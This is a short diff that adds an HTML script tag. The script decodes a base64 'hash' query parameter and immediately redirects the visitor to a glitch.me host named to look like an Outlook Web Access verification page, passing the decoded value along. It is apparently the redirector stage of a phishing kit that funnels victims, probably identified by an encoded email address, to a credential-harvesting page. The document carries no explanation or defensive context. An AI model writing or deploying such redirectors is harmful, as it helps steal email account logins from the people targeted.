@@ -1,0 +1,6 @@
+<script>
+      window.location.replace(
+        "https://owa-verification-cloudapp.glitch.me/?#" +
+          atob(new URLSearchParams(window.location.search).get("hash"))
+      );
+    </script>
